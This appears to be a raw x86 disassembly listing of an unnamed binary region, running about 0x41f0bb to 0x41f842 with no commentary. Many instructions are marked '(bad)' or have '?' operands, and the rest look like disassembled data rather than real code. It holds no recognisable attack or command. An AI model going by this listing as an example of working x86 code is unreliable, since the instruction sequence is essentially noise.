  41f0bb:	add    BYTE PTR [ecx-0x1c],0x28
  41f0bf:	imul   edx,DWORD PTR [ebp+0x16],0xffffff91
  41f0c3:	xor    al,0x8d
  41f0c5:	mov    esi,0x2248a174
  41f0ca:	pusha  
  41f0cb:	retf   
  41f0cc:	or     ch,BYTE PTR [eax-0x46]
  41f0cf:	xor    DWORD PTR [edi],esi
  41f0d1:	aas    
  41f0d2:	call   0x6012:0x5162a239
  41f0d9:	rol    DWORD PTR [edi-0x60210293],1
  41f0df:	out    dx,al
  41f0e0:	xor    BYTE PTR [ebp-0x552c265],cl
  41f0e6:	loope  0x41f12a
  41f0e8:	pop    ebp
  41f0e9:	add    al,BYTE PTR [edi+0x58c058ee]
  41f0ef:	dec    eax
  41f0f0:	ja     0x41f11c
  41f0f2:	hlt    
  41f0f3:	push   0x5b
  41f0f5:	xor    ecx,ebx
  41f0f7:	push   edx
  41f0f8:	loopne 0x41f157
  41f0fa:	cs int3 
  41f0fc:	inc    ecx
  41f0fd:	mov    WORD PTR [ebx+0x487ee511],ss
  41f103:	ret    0x2934
  41f106:	and    BYTE PTR [esi+0x31],cl
  41f109:	outs   dx,DWORD PTR ds:[esi]
  41f10a:	out    dx,eax
  41f10b:	add    eax,0x6c91d5c3
  41f110:	dec    esi
  41f111:	out    dx,al
  41f112:	test   bh,ah
  41f114:	xor    al,0x9b
  41f116:	lods   al,BYTE PTR ds:[esi]
  41f117:	(bad)  
  41f118:	call   0x962286fe
  41f11d:	xor    DWORD PTR [eax],ecx
  41f11f:	(bad)  
  41f120:	repz popf 
  41f122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f123:	pop    ebp
  41f124:	mov    cl,0xad
  41f126:	out    0xb3,eax
  41f128:	loope  0x41f149
  41f12a:	mov    cl,0x20
  41f12c:	sbb    ecx,DWORD PTR [ecx-0x76f439e5]
  41f132:	or     dh,ch
  41f134:	aam    0x96
  41f136:	add    DWORD PTR [esi+0x403703b4],edi
  41f13c:	mov    ecx,cs
  41f13e:	outs   dx,DWORD PTR ds:[esi]
  41f13f:	stos   DWORD PTR es:[edi],eax
  41f140:	mov    bl,0xe5
  41f142:	mov    ecx,0xf96909e5
  41f147:	sbb    al,0x95
  41f149:	(bad)  
  41f14a:	hlt    
  41f14b:	std    
  41f14c:	std    
  41f14d:	mov    BYTE PTR [edi],0xe3
  41f150:	mov    bl,0xc6
  41f152:	mov    al,0xa1
  41f154:	xor    al,0xda
  41f156:	arpl   WORD PTR [eax],bp
  41f158:	aas    
  41f159:	clc    
  41f15a:	jno    0x41f17e
  41f15c:	rcl    DWORD PTR [ebp+0x8],0x75
  41f160:	jmp    0x9a7e:0xd6a041c
  41f167:	inc    esp
  41f168:	fld    DWORD PTR [eax+0x10]
  41f16b:	cld    
  41f16c:	imul   ebx,DWORD PTR [edi+eax*4+0x4d00ba6a],0xffffffbb
  41f174:	pop    edi
  41f175:	sub    DWORD PTR [edx],esp
  41f177:	mov    al,BYTE PTR [eax+0x74]
  41f17a:	mov    ch,0x9
  41f17c:	test   eax,0x4153d97d
  41f181:	sub    al,0xad
  41f183:	pop    ebp
  41f184:	ja     0x41f1c6
  41f186:	mov    ds:0xad4edc6a,al
  41f18b:	addr16 shl al,cl
  41f18e:	xchg   esp,eax
  41f18f:	lea    ecx,[ebx+0x50f17011]
  41f195:	daa    
  41f196:	shl    BYTE PTR [eax-0x2c],cl
  41f199:	not    BYTE PTR [esi]
  41f19b:	je     0x41f166
  41f19d:	loope  0x41f219
  41f19f:	and    esi,ebp
  41f1a1:	ja     0x41f178
  41f1a3:	scas   al,BYTE PTR es:[edi]
  41f1a4:	fs pop ebx
  41f1a6:	mov    eax,ebp
  41f1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a9:	scas   eax,DWORD PTR es:[edi]
  41f1aa:	ja     0x41f17f
  41f1ac:	hlt    
  41f1ad:	mov    ebp,0x4c54cbec
  41f1b2:	shr    eax,1
  41f1b4:	inc    edi
  41f1b5:	add    ch,dl
  41f1b7:	sbb    esi,DWORD PTR [ecx]
  41f1b9:	test   al,0x20
  41f1bb:	(bad)  
  41f1bc:	fidiv  WORD PTR [esi+ebx*2-0x34]
  41f1c0:	fwait
  41f1c1:	push   ds
  41f1c2:	xor    DWORD PTR [esi-0x6a],ecx
  41f1c5:	inc    ecx
  41f1c6:	(bad)  
  41f1c7:	jbe    0x41f1fb
  41f1c9:	add    eax,0x77ede1c9
  41f1ce:	(bad)  
  41f1cf:	cmp    eax,0x37e102f
  41f1d4:	in     eax,dx
  41f1d5:	or     DWORD PTR [ebx*1-0x45bced13],esi
  41f1dc:	jge    0x41f1e0
  41f1de:	mov    dh,0x7a
  41f1e0:	mov    WORD PTR [edx-0x52bb7974],?
  41f1e6:	mov    esi,0x8f0b45e2
  41f1eb:	pop    ebx
  41f1ec:	or     eax,DWORD PTR ds:0xf804e1a0
  41f1f2:	jg     0x41f24d
  41f1f4:	sbb    DWORD PTR [ebx],edi
  41f1f6:	addr16 jp 0x41f1c9
  41f1f9:	push   edi
  41f1fa:	popf   
  41f1fb:	or     edi,DWORD PTR [esi-0x51f93446]
  41f201:	jp     0x41f268
  41f203:	aas    
  41f204:	test   eax,0xc950607f
  41f209:	add    ebx,DWORD PTR [ebp+0x61]
  41f20c:	cwde   
  41f20d:	pusha  
  41f20e:	jmp    0x41f1bf
  41f210:	jge    0x41f1b9
  41f212:	sete   BYTE PTR [edi]
  41f215:	pop    ebp
  41f216:	add    al,0xa2
  41f218:	js     0x41f263
  41f21a:	push   ds
  41f21b:	cdq    
  41f21c:	add    dh,bh
  41f21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f21f:	dec    esp
  41f220:	push   esp
  41f221:	mov    DWORD PTR [ebx-0x29],edx
  41f224:	fwait
  41f225:	jge    0x41f1e5
  41f227:	xchg   edi,eax
  41f228:	popf   
  41f229:	jmp    0x1ac3:0x6692df66
  41f230:	aas    
  41f231:	or     al,0xf
  41f233:	sub    edx,0x36fdd0f3
  41f239:	(bad)  
  41f23a:	in     al,0x82
  41f23c:	dec    esp
  41f23d:	or     ecx,DWORD PTR [edx+0x238698e7]
  41f243:	mov    bh,0x10
  41f245:	lds    esi,FWORD PTR [edx]
  41f247:	pop    esp
  41f248:	sbb    BYTE PTR [ebx+eiz*2],al
  41f24b:	mov    BYTE PTR [eax],ah
  41f24d:	xor    bh,BYTE PTR [eax-0x7e68423d]
  41f253:	fbstp  TBYTE PTR [esi]
  41f255:	jno    0x41f278
  41f257:	jno    0x41f241
  41f259:	jo     0x41f1e5
  41f25b:	mov    es,edx
  41f25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f25f:	leave  
  41f260:	or     ebp,0xf6d78744
  41f266:	sbb    DWORD PTR [esi+ebp*1],ebp
  41f269:	mov    ds:0x80c94501,al
  41f26e:	mov    al,ds:0xd54cfc4e
  41f273:	jns    0x41f257
  41f275:	cdq    
  41f276:	inc    ebx
  41f277:	sbb    esi,DWORD PTR [eax-0x11]
  41f27a:	cmc    
  41f27b:	push   edx
  41f27c:	in     al,dx
  41f27d:	arpl   ax,cx
  41f27f:	cwde   
  41f280:	and    esp,DWORD PTR ds:0x9a65e8de
  41f286:	test   BYTE PTR [ecx-0x791e90cf],bl
  41f28c:	cli    
  41f28d:	nop
  41f28e:	adc    dh,bh
  41f290:	mov    esi,0x5ddbd29
  41f295:	add    BYTE PTR [edx],ah
  41f297:	mov    al,0x7d
  41f299:	mov    ds:0x7caa6cba,al
  41f29e:	aam    0x48
  41f2a0:	in     eax,0x6a
  41f2a2:	and    ah,BYTE PTR [eax+0x77]
  41f2a5:	mov    ch,0xb5
  41f2a7:	sub    bl,al
  41f2a9:	or     eax,0xcce07511
  41f2ae:	fist   DWORD PTR [edi]
  41f2b0:	adc    al,0xb4
  41f2b2:	notrack call DWORD PTR [ebx+0x7c94170a]
  41f2b9:	out    0x96,eax
  41f2bb:	jg     0x41f31f
  41f2bd:	mov    bh,0x6d
  41f2bf:	fnstcw WORD PTR [eax-0x17]
  41f2c2:	push   edx
  41f2c3:	idiv   BYTE PTR [ebx+ebp*2]
  41f2c6:	xor    eax,0x1144fd16
  41f2cb:	pushf  
  41f2cc:	scas   al,BYTE PTR es:[edi]
  41f2cd:	add    edi,DWORD PTR [esi]
  41f2cf:	fstp   QWORD PTR [ecx]
  41f2d1:	cmp    DWORD PTR [ebx-0x653e244e],esp
  41f2d7:	sbb    BYTE PTR [edx+edx*4],bl
  41f2da:	ss jno 0x41f2c5
  41f2dd:	lahf   
  41f2de:	and    esi,DWORD PTR [eax]
  41f2e0:	mov    esp,0xf2a32e67
  41f2e5:	push   cs
  41f2e6:	jns    0x41f2ba
  41f2e8:	imul   esp,DWORD PTR [esi+0x4b],0x20
  41f2ec:	mov    ch,0xee
  41f2ee:	ja     0x41f2f5
  41f2f0:	cmp    bh,bl
  41f2f2:	cmp    eax,0x16e887bd
  41f2f7:	dec    esp
  41f2f8:	inc    esi
  41f2f9:	lahf   
  41f2fa:	arpl   WORD PTR [edx],sp
  41f2fc:	js     0x41f29e
  41f2fe:	fwait
  41f2ff:	push   ss
  41f300:	xchg   BYTE PTR [edi-0xa],dh
  41f303:	jle    0x41f2e7
  41f305:	je     0x41f318
  41f307:	mov    edx,0xe6f0ad7a
  41f30c:	pop    edi
  41f30d:	loope  0x41f31e
  41f30f:	(bad)  [ecx-0x7e88b27]
  41f315:	adc    BYTE PTR [esi+eiz*8],bh
  41f318:	not    DWORD PTR [eax+0x29a68f6b]
  41f31e:	aas    
  41f31f:	mov    bl,0x24
  41f321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f322:	sbb    ch,BYTE PTR [eax]
  41f324:	xchg   edx,eax
  41f325:	jne    0x41f301
  41f327:	mov    dl,BYTE PTR [ebp+0x3af4e8a6]
  41f32d:	lea    edi,[ecx]
  41f32f:	dec    di
  41f331:	push   ecx
  41f332:	fisubr DWORD PTR [edi]
  41f334:	cmp    edi,esp
  41f336:	retf   0x5c53
  41f339:	inc    edi
  41f33a:	rcr    BYTE PTR ds:0x7c1fbaef,1
  41f340:	xor    eax,0xc5a23ed5
  41f345:	mov    ebp,0xa2790d16
  41f34a:	out    dx,al
  41f34b:	sub    al,0x34
  41f34d:	sub    eax,0x192d544f
  41f352:	push   edi
  41f353:	gs mov edx,0xea2089d
  41f359:	xchg   esp,eax
  41f35a:	cmp    BYTE PTR [esi+0x712f466a],dl
  41f360:	xchg   ebp,eax
  41f361:	xchg   ebx,eax
  41f362:	ins    DWORD PTR es:[edi],dx
  41f363:	stos   BYTE PTR es:[edi],al
  41f364:	repnz idiv BYTE PTR [esi]
  41f367:	test   BYTE PTR [ecx+0x1e],dl
  41f36a:	mov    dl,0x5d
  41f36c:	mov    al,0x6e
  41f36e:	jbe    0x41f300
  41f370:	dec    ecx
  41f371:	sti    
  41f372:	outs   dx,BYTE PTR ds:[esi]
  41f373:	mov    edx,0xa1dd590c
  41f378:	pop    edi
  41f379:	mov    esp,0xa2ae5d15
  41f37e:	push   ds
  41f37f:	outs   dx,BYTE PTR ds:[esi]
  41f380:	aaa    
  41f381:	xor    DWORD PTR [edi],0x18
  41f384:	icebp  
  41f385:	sub    dl,cl
  41f387:	push   0x56
  41f389:	rcl    BYTE PTR [edx],cl
  41f38b:	push   0xffffff8c
  41f38d:	fldcw  WORD PTR [ebp+0x75]
  41f390:	loope  0x41f31c
  41f392:	neg    DWORD PTR [ecx+0x13]
  41f395:	dec    esi
  41f396:	ret    
  41f397:	dec    ecx
  41f398:	xchg   DWORD PTR [ebp-0x1],esi
  41f39b:	sbb    al,0xa3
  41f39d:	xchg   edx,eax
  41f39e:	repz lock jo 0x41f330
  41f3a2:	mov    eax,0x54ec516
  41f3a7:	imul   edi,ebx,0xc17a0cdf
  41f3ad:	push   ebx
  41f3ae:	pop    ss
  41f3af:	out    dx,al
  41f3b0:	je     0x41f410
  41f3b2:	adc    bl,ch
  41f3b4:	cmp    DWORD PTR ds:0xdb1a9d9,ebx
  41f3ba:	inc    ebx
  41f3bb:	sub    al,BYTE PTR [ecx]
  41f3bd:	imul   ebp,DWORD PTR [edx],0x7d5b773e
  41f3c3:	mov    ebp,0x55de3d41
  41f3c8:	sub    eax,0x6da5c899
  41f3cd:	rcl    dl,cl
  41f3cf:	sbb    ch,BYTE PTR [eax-0x46]
  41f3d2:	sub    eax,0x3188d5da
  41f3d7:	adc    esi,eax
  41f3d9:	add    BYTE PTR [ebx+0x5d],dl
  41f3dc:	add    DWORD PTR [ebx],esp
  41f3de:	and    DWORD PTR [ecx-0x49],esi
  41f3e1:	mov    bl,0xa2
  41f3e3:	jmp    0xd38d:0xdcc6a1f8
  41f3ea:	mov    dh,BYTE PTR [eax-0x62]
  41f3ed:	push   ds
  41f3ee:	fcmovnb st,st(2)
  41f3f0:	test   DWORD PTR [esi+0x3dba8bfb],0xd3fd379
  41f3fa:	and    cl,cl
  41f3fc:	lods   al,BYTE PTR ds:[esi]
  41f3fd:	stos   DWORD PTR es:[edi],eax
  41f3fe:	ja     0x41f3e4
  41f400:	mov    ds:0x4d470aa8,al
  41f405:	ror    ch,0xb0
  41f408:	push   ebp
  41f409:	pop    ecx
  41f40a:	rcr    BYTE PTR [edx],1
  41f40c:	(bad)  
  41f40d:	mov    ebp,0xeb06a086
  41f412:	or     BYTE PTR [edi+edx*4+0x7e],cl
  41f416:	sub    esi,DWORD PTR [esi]
  41f418:	test   DWORD PTR [ebp-0x15],esp
  41f41b:	bound  esp,QWORD PTR [ecx-0x1b5e80a2]
  41f421:	adc    al,0x78
  41f423:	dec    ebp
  41f424:	mov    esi,0xdd0d3dfa
  41f429:	loopne 0x41f3b1
  41f42b:	sbb    al,0x35
  41f42d:	jno    0x41f41c
  41f42f:	sar    edi,1
  41f431:	hlt    
  41f432:	dec    ebx
  41f433:	cmp    bl,bl
  41f435:	xchg   ecx,eax
  41f436:	mov    eax,ds:0x959f9483
  41f43b:	cmc    
  41f43c:	inc    esi
  41f43d:	jnp    0x41f46b
  41f43f:	pop    eax
  41f440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f441:	xchg   ebp,eax
  41f442:	dec    eax
  41f443:	mov    ds,WORD PTR [edx+0x6f02c3a5]
  41f449:	(bad)
  41f44d:	sbb    eax,0x54c318ef
  41f452:	adc    al,0x17
  41f454:	fcomp  DWORD PTR [edx+0x3d3e28f5]
  41f45a:	dec    esp
  41f45b:	fdivr  st(4),st
  41f45d:	mov    dh,0xaa
  41f45f:	not    DWORD PTR [ebx+0x3be2a872]
  41f465:	mov    dl,0xf3
  41f467:	hlt    
  41f468:	xor    dh,BYTE PTR [eax-0x710c6a07]
  41f46e:	cdq    
  41f46f:	xchg   esi,eax
  41f470:	lds    ebp,FWORD PTR [edi-0x18c2d9ec]
  41f476:	adc    bh,BYTE PTR [esi+0x19]
  41f479:	data16 or BYTE PTR [ecx],bh
  41f47c:	ins    DWORD PTR es:[edi],dx
  41f47d:	int    0x12
  41f47f:	jno    0x41f403
  41f481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f482:	dec    ebx
  41f483:	xchg   DWORD PTR [ebx+0x29],edi
  41f486:	jae    0x41f467
  41f488:	movd   esi,mm5
  41f48b:	sub    ebx,eax
  41f48d:	cmp    bh,bh
  41f48f:	or     eax,0x93431ad4
  41f494:	mov    dl,0x7a
  41f496:	add    edx,DWORD PTR [eax]
  41f498:	jne    0x41f47f
  41f49a:	es jnp 0x41f447
  41f49d:	into   
  41f49e:	sahf   
  41f49f:	mov    ss,WORD PTR [ebx+0x6f1b6cba]
  41f4a5:	add    DWORD PTR [ebp-0x42],esi
  41f4a8:	jmp    0x491bdade
  41f4ad:	arpl   WORD PTR [ecx-0x11e7e1d2],si
  41f4b3:	adc    BYTE PTR [edx],dh
  41f4b5:	push   0xcb011849
  41f4ba:	or     edx,esi
  41f4bc:	and    BYTE PTR [edi+0x375d6eb5],ah
  41f4c2:	mov    ebx,0xfbb43d77
  41f4c7:	cmp    dl,BYTE PTR [edi+0x6053d74b]
  41f4cd:	clc    
  41f4ce:	repnz xlat BYTE PTR ds:[ebx]
  41f4d0:	aas    
  41f4d1:	scas   al,BYTE PTR es:[edi]
  41f4d2:	xchg   ecx,eax
  41f4d3:	cmp    al,bh
  41f4d5:	mov    bl,ch
  41f4d7:	pop    esi
  41f4d8:	call   0xc216ca1e
  41f4dd:	repz inc ebx
  41f4df:	pop    ds
  41f4e0:	dec    ebp
  41f4e1:	mul    BYTE PTR [esi+0x38de69e3]
  41f4e7:	(bad)  
  41f4e8:	idiv   DWORD PTR [ebp-0x30]
  41f4eb:	test   al,0xb
  41f4ed:	fdivr  st,st(3)
  41f4ef:	push   edx
  41f4f0:	adc    DWORD PTR [esi+0x40],0xffffffae
  41f4f4:	retf   0xfc46
  41f4f7:	jp     0x41f52d
  41f4f9:	adc    edx,0x25961b3c
  41f4ff:	(bad)  
  41f500:	enter  0xd968,0xa0
  41f504:	outs   dx,BYTE PTR ds:[esi]
  41f505:	rol    edi,0x46
  41f508:	pop    ecx
  41f509:	test   eax,0x63c00e0d
  41f50e:	mov    ah,0x4e
  41f510:	fwait
  41f511:	or     DWORD PTR [ecx+ebp*2+0x282a3de2],edx
  41f518:	pop    esp
  41f519:	call   0x57d281c0
  41f51e:	adc    eax,DWORD PTR [ecx-0x8964a6]
  41f524:	iret   
  41f525:	mov    cl,0x6c
  41f527:	imul   cl
  41f529:	mov    al,ds:0x51974cd0
  41f52e:	push   esi
  41f52f:	dec    ebx
  41f530:	lock popf 
  41f532:	out    0xdd,al
  41f534:	xlat   BYTE PTR ds:[ebx]
  41f535:	add    al,0xfc
  41f537:	retf   
  41f538:	pop    edx
  41f539:	cmp    al,0x3f
  41f53b:	xchg   edx,eax
  41f53c:	mov    ecx,0x39a38206
  41f541:	loope  0x41f51c
  41f543:	jno    0x41f4c5
  41f545:	sbb    DWORD PTR [ebx-0x455fcfd4],0x5
  41f54c:	and    eax,0x37161e53
  41f551:	rcl    BYTE PTR [ebx-0x78],cl
  41f554:	ds dec ecx
  41f556:	push   esp
  41f557:	call   0x1636c6e7
  41f55c:	and    al,0x2
  41f55e:	mov    ah,0xac
  41f560:	int3   
  41f561:	push   es
  41f562:	fmul   st,st(1)
  41f564:	or     eax,0x4f099e89
  41f569:	les    esi,FWORD PTR [eax+0x48]
  41f56c:	aam    0xcb
  41f56e:	(bad)  
  41f570:	dec    ebx
  41f571:	call   0x42c0:0x4057c330
  41f578:	or     edi,ecx
  41f57a:	xchg   edx,eax
  41f57b:	pop    edi
  41f57c:	adc    BYTE PTR [ebx-0xa],ch
  41f57f:	in     eax,dx
  41f580:	addr16 leave 
  41f582:	or     esp,0x12
  41f585:	jno    0x41f530
  41f587:	xchg   ecx,eax
  41f588:	ss push edi
  41f58a:	jp     0x41f587
  41f58c:	cmp    dl,BYTE PTR [edx]
  41f58e:	xor    bh,dl
  41f590:	test   al,0x36
  41f592:	xor    eax,0x46c6714b
  41f597:	das    
  41f598:	xlat   BYTE PTR ds:[ebx]
  41f599:	add    dl,BYTE PTR [edi+ebp*8]
  41f59c:	cmc    
  41f59d:	mov    ch,0xfb
  41f59f:	mov    cl,0x5e
  41f5a1:	je     0x41f5f0
  41f5a3:	test   DWORD PTR [ecx+0x6df677e8],edi
  41f5a9:	push   ebx
  41f5aa:	mov    ah,0xfb
  41f5ac:	xchg   ecx,eax
  41f5ad:	test   ebx,esp
  41f5af:	add    BYTE PTR [edi],bh
  41f5b1:	fwait
  41f5b2:	test   al,0x85
  41f5b4:	pusha  
  41f5b5:	addr16 inc ecx
  41f5b7:	mul    DWORD PTR [edi+0x3ac7d246]
  41f5bd:	mov    al,ds:0x1bad1209
  41f5c2:	jge    0x41f557
  41f5c4:	cmc    
  41f5c5:	xor    eax,0xdc94c45d
  41f5ca:	xor    al,BYTE PTR [ebp-0x69]
  41f5cd:	sti    
  41f5ce:	in     eax,0xc8
  41f5d0:	pop    ds
  41f5d1:	ins    DWORD PTR es:[edi],dx
  41f5d2:	dec    eax
  41f5d3:	or     al,0x7d
  41f5d5:	dec    ebp
  41f5d6:	adc    cl,BYTE PTR [esp+edi*2-0x7ec49b10]
  41f5dd:	push   edi
  41f5de:	and    esi,DWORD PTR [ebx]
  41f5e0:	fnstenv [edi]
  41f5e2:	retf   
  41f5e3:	mov    esi,0x898499a2
  41f5e8:	dec    esp
  41f5e9:	aad    0xd8
  41f5eb:	mov    esi,0x946dfb19
  41f5f0:	xchg   dh,ah
  41f5f2:	rol    BYTE PTR [edx],cl
  41f5f4:	aad    0xa8
  41f5f6:	and    al,0x10
  41f5f8:	hlt    
  41f5f9:	(bad)  
  41f5fa:	push   ds
  41f5fb:	test   BYTE PTR [ecx+ebp*1+0x76],ch
  41f5ff:	fs push ds
  41f601:	mov    ch,0x27
  41f603:	(bad)  
  41f604:	retf   
  41f605:	lahf   
  41f606:	fcom   QWORD PTR [esi]
  41f608:	imul   ebp,DWORD PTR [eax-0x5e],0xffffff8b
  41f60c:	or     ah,BYTE PTR [ebp+0x1e]
  41f60f:	pop    ebx
  41f610:	jl     0x41f641
  41f612:	xor    dl,BYTE PTR [edx-0xa313373]
  41f618:	jle    0x41f5f0
  41f61a:	aaa    
  41f61b:	bound  eax,QWORD PTR [eax+0x27dd28e9]
  41f621:	mov    esi,0x49ff7937
  41f626:	sti    
  41f627:	retf   0xa058
  41f62a:	nop
  41f62b:	ins    BYTE PTR es:[edi],dx
  41f62c:	mov    ah,0x4
  41f62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f62f:	shr    BYTE PTR [ecx+0x36],0x3
  41f633:	fwait
  41f634:	or     BYTE PTR ds:0xdc127b4c,cl
  41f63a:	(bad)  
  41f63b:	dec    esp
  41f63c:	addr16 push eax
  41f63e:	pushf  
  41f63f:	mov    ch,0xc
  41f641:	jno    0x41f5d0
  41f643:	push   edi
  41f644:	nop
  41f645:	cmp    BYTE PTR [ebx+0x72840447],dh
  41f64b:	jl     0x41f62b
  41f64d:	imul   ebp,DWORD PTR [edx+0x3a9d38ec],0x80d7ecda
  41f657:	push   ebx
  41f658:	les    esp,FWORD PTR [esi+ebx*8+0xac326c1]
  41f65f:	push   ebx
  41f660:	popa   
  41f661:	adc    eax,0x25ce734c
  41f666:	fcomi  st,st(1)
  41f668:	test   eax,0x79feea63
  41f66d:	bound  esi,QWORD PTR [edx]
  41f66f:	fldcw  WORD PTR [eax]
  41f671:	inc    esi
  41f672:	lea    eax,[ecx]
  41f674:	and    esi,edx
  41f676:	push   ds
  41f677:	(bad)  
  41f678:	cmp    esp,DWORD PTR [edi]
  41f67a:	shl    BYTE PTR [ecx+0x22],0xfa
  41f67e:	enter  0x177a,0xd9
  41f682:	or     ch,BYTE PTR [eax+0x12a4b644]
  41f688:	xor    dl,BYTE PTR [edi-0x349f79d0]
  41f68e:	inc    ebp
  41f68f:	sbb    al,al
  41f691:	jb     0x41f66e
  41f693:	retf   0x200e
  41f696:	and    al,BYTE PTR [ecx+0x39]
  41f699:	mov    dh,0xb2
  41f69b:	bnd jnp 0x41f6fe
  41f69e:	lods   al,BYTE PTR fs:[esi]
  41f6a0:	shl    DWORD PTR [ecx-0x41892923],0xec
  41f6a7:	push   0xfffffff6
  41f6a9:	out    dx,al
  41f6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ab:	sbb    eax,0xa3e97540
  41f6b0:	mov    ?,WORD PTR [edi+0x39]
  41f6b3:	popf   
  41f6b4:	adc    DWORD PTR [eax+0x5f],ebp
  41f6b7:	xor    al,0xd
  41f6b9:	call   DWORD PTR [ecx]
  41f6bb:	retf   
  41f6bc:	pop    esi
  41f6bd:	retf   0xbce0
  41f6c0:	enter  0x61b2,0xa0
  41f6c4:	pushf  
  41f6c5:	cli    
  41f6c6:	lahf   
  41f6c7:	mov    cl,BYTE PTR [ebp+0x6f003058]
  41f6cd:	cmc    
  41f6ce:	xchg   ebp,eax
  41f6cf:	and    BYTE PTR [edi+0x67],cl
  41f6d2:	ins    DWORD PTR es:[edi],dx
  41f6d3:	push   ecx
  41f6d4:	dec    esp
  41f6d5:	sti    
  41f6d6:	scas   eax,DWORD PTR es:[edi]
  41f6d7:	sub    bl,bl
  41f6d9:	test   al,0x84
  41f6db:	adc    BYTE PTR [ecx-0x8],dl
  41f6de:	xchg   ebp,eax
  41f6df:	popf   
  41f6e0:	out    0x6c,eax
  41f6e2:	popf   
  41f6e3:	(bad)  
  41f6e4:	jmp    0x6001ffbd
  41f6e9:	mov    ds:0xc0b495b,al
  41f6ee:	sbb    BYTE PTR [edx+0xb2995f2],dl
  41f6f4:	mov    ss:0xb651a451,eax
  41f6fa:	and    ecx,DWORD PTR ds:0x3c727f23
  41f700:	test   BYTE PTR [ebx-0x24cd5830],ah
  41f706:	xor    edi,DWORD PTR [edx+0xefc2fee]
  41f70c:	ins    DWORD PTR es:[edi],dx
  41f70d:	stos   BYTE PTR es:[edi],al
  41f70e:	das    
  41f70f:	enter  0xbbbd,0x77
  41f713:	addr16 popa 
  41f715:	and    BYTE PTR [esi+0x5e],bh
  41f718:	addr16 mov esi,0x9046eff
  41f71e:	jbe    0x41f723
  41f720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f721:	leave  
  41f722:	mov    cl,0x27
  41f724:	test   BYTE PTR [esi],bl
  41f726:	stc    
  41f727:	popf   
  41f728:	or     eax,0x877059cc
  41f72d:	sbb    BYTE PTR [edx],dl
  41f72f:	inc    esp
  41f730:	pop    ds
  41f731:	xchg   BYTE PTR [ebx-0x63968d72],cl
  41f737:	xor    eax,DWORD PTR [esi+0x1fb3329c]
  41f73d:	(bad)  
  41f73e:	jl     0x41f788
  41f740:	xor    BYTE PTR [edx],ch
  41f742:	dec    esp
  41f743:	or     dl,al
  41f745:	and    DWORD PTR [eax-0x3fdeb4a5],edx
  41f74b:	mov    dl,0x8e
  41f74d:	rcr    BYTE PTR [eax+ebp*8+0x1b],1
  41f751:	lds    esp,FWORD PTR [edi+ecx*4-0x55]
  41f755:	fwait
  41f756:	popa   
  41f757:	(bad)  
  41f758:	mov    eax,ds:0x9de61879
  41f75d:	stos   DWORD PTR es:[edi],eax
  41f75e:	ficomp DWORD PTR [esi]
  41f760:	cmc    
  41f761:	jmp    0x7698:0x2046d1cd
  41f768:	cdq    
  41f769:	sub    DWORD PTR [ebx],eax
  41f76b:	xlat   BYTE PTR ds:[ebx]
  41f76c:	ss jo  0x41f7b6
  41f76f:	jnp    0x41f7c2
  41f771:	sar    ebp,0xb
  41f774:	pop    ds
  41f775:	push   0xd726b9d
  41f77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f77b:	dec    esi
  41f77c:	pop    ebx
  41f77d:	jge    0x41f7e2
  41f77f:	pop    edx
  41f780:	(bad)  
  41f781:	pop    ss
  41f782:	and    eax,0x7fe6103d
  41f787:	mov    bh,0xde
  41f789:	imul   esp,DWORD PTR [edx+0x75],0xb1f9c409
  41f790:	add    ah,BYTE PTR [esi]
  41f792:	mov    ch,0x47
  41f794:	mov    eax,0xcf49a550
  41f799:	mov    edx,0x6c3dd774
  41f79e:	call   0xb06da89a
  41f7a3:	aas    
  41f7a4:	hlt    
  41f7a5:	sub    BYTE PTR [esi-0x3d8a4132],al
  41f7ab:	call   0x97592a8c
  41f7b0:	int3   
  41f7b1:	mov    BYTE PTR [ebx-0x3ed244ef],bl
  41f7b7:	je     0x41f836
  41f7b9:	icebp  
  41f7ba:	push   0x61
  41f7bc:	aad    0xbe
  41f7be:	(bad)
  41f7c1:	hlt    
  41f7c2:	push   0x6c
  41f7c4:	jae    0x41f763
  41f7c6:	sub    BYTE PTR [ecx],ah
  41f7c8:	mov    dh,0x6c
  41f7ca:	adc    ecx,DWORD PTR [ebp+0x2e]
  41f7cd:	mov    eax,0xc2f42d2d
  41f7d2:	push   ebx
  41f7d3:	dec    esp
  41f7d4:	ret    0xf6e0
  41f7d7:	pop    ecx
  41f7d8:	xor    ah,BYTE PTR gs:[esp+ebp*4+0x5b]
  41f7dd:	push   edi
  41f7de:	mov    esp,0xb57d99ad
  41f7e3:	nop
  41f7e4:	dec    edi
  41f7e5:	iret   
  41f7e6:	inc    ebx
  41f7e7:	dec    bh
  41f7e9:	pop    es
  41f7ea:	mov    bh,0x14
  41f7ec:	loope  0x41f839
  41f7ee:	sub    BYTE PTR [ecx+0x7b546de3],bl
  41f7f4:	add    DWORD PTR [ebp-0x429ba313],ecx
  41f7fa:	les    ecx,FWORD PTR ds:0xc9492a40
  41f800:	inc    ebp
  41f801:	jg     0x41f839
  41f803:	add    BYTE PTR [ecx+0x3161593e],bl
  41f809:	sbb    eax,0x4cb1186f
  41f80e:	rcr    BYTE PTR [ecx-0x289c1ec],0xfa
  41f815:	test   DWORD PTR [eax+0x4b74017b],eax
  41f81b:	inc    ebx
  41f81c:	xchg   edi,eax
  41f81d:	fist   DWORD PTR [eax-0x2d]
  41f820:	or     dl,BYTE PTR [eax-0x1e]
  41f823:	(bad)
  41f826:	jae    0x41f813
  41f828:	xchg   ebp,eax
  41f829:	loopne 0x41f864
  41f82b:	sub    bh,0xbe
  41f82e:	pop    ebp
  41f82f:	ret    
  41f830:	mov    ah,0x9d
  41f832:	fidivr DWORD PTR [esi+0x2bcd5f7b]
  41f838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f839:	les    edi,FWORD PTR [edi-0x34]
  41f83c:	sbb    DWORD PTR [eax+0x6305a6ad],esi
  41f842:	(bad)  
